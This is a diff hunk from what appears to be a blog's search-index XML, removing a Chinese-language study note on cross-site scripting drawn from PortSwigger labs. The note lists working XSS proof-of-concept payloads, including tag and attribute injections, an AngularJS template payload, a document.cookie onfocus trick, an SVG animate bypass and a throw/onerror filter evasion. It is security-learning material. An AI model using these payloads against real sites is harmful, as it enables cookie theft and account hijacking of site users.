@@ -2557,38 +2686,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Pentesting</tag>
         <tag>HackTheBox</tag>
         <tag>Wifi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS Note</title>
-    <url>/2023/12/23/xss-note/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：<br><a href="https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss">Port Swigger</a><br>p.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;  </p>
-<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><h3 id="Basic-Payloads"><a href="#Basic-Payloads" class="headerlink" title="Basic Payloads:"></a>Basic Payloads:</h3><p>來複習一下(～￣▽￣)～<br><strong>For HTML:</strong>  </p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span></span><br><span class="line">&#x27;;-alert(1)-;&#x27;</span><br><span class="line">blablalba</span><br></pre></td></tr></table></figure>
-<p><strong>Javascript Injection:</strong>  </p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);\\</span></span><br><span class="line"><span class="string">blablabla</span></span><br></pre></td></tr></table></figure>
-<p><strong>DOM Base:</strong><br>是觸發於<code>document.write</code>這類寫入函數的弱點。<br>開啟Burp Suite Browser的f12工具列，找到DOM Invader，搜尋自己的input然後構造payload，後面就跟前面一樣ㄌ  </p>
-<h3 id="HTML-Encode-Trick"><a href="#HTML-Encode-Trick" class="headerlink" title="HTML Encode Trick"></a>HTML Encode Trick</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">apos;-<span class="title function_">alert</span>(<span class="number">1</span>)-&amp;apos;</span><br></pre></td></tr></table></figure>
-<h3 id="Angular-js"><a href="#Angular-js" class="headerlink" title="Angular js"></a>Angular js</h3><p>Angular js 會去抓取格式如<code>&#123;&#123;&#125;&#125;</code>的東西當作模板去做處理，就跟SSTI一樣。<br><strong>Payloads</strong><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">Angular js SSTI Payloads on Github</a>  </p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Blocked-html-tags"><a href="#Blocked-html-tags" class="headerlink" title="Blocked html tags"></a>Blocked html tags</h3><p>第一個想法一定是暴力看看有那些tags和arguments可以用<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Payload List on Port Swigger</a><br>如果都不行的話，構造一個不存在的tag然後利用id+onfocus以及url fragment(<code>#</code>)去觸發XSS：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;xss+id=x+onfocus=<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) tabindex=<span class="number">1</span>&gt;#x<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
-<h3 id="Backtick-Injection"><a href="#Backtick-Injection" class="headerlink" title="Backtick Injection"></a>Backtick Injection</h3><p>透過使用如<code>$&#123;&#125;</code>的方式去呼叫js，一樣是一種SSTI(?)</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="XML-attributeName"><a href="#XML-attributeName" class="headerlink" title="XML attributeName"></a>XML attributeName</h3><p>利用XML attributeName去改掉父標籤屬性。  </p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;animate+attributeName=href+values=javascript:alert(1)+/&gt;&lt;text+x=20+y=20&gt;Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="js-throw"><a href="#js-throw" class="headerlink" title="js throw"></a>js throw</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">lab</a>  </p>
-<ul>
-<li>利用資料解析方式的不同去觸發injection</li>
-</ul>
-<p>throw+onerror可以觸發一系列行為。  </p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>&amp;<span class="string">&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;</span><span class="string">&#x27;,&#123;x:&#x27;</span></span><br></pre></td></tr></table></figure>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>應該還有些東西要補(  </p>
-]]></content>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>XSS</tag>
-        <tag>Note</tag>
       </tags>
   </entry>
   <entry>
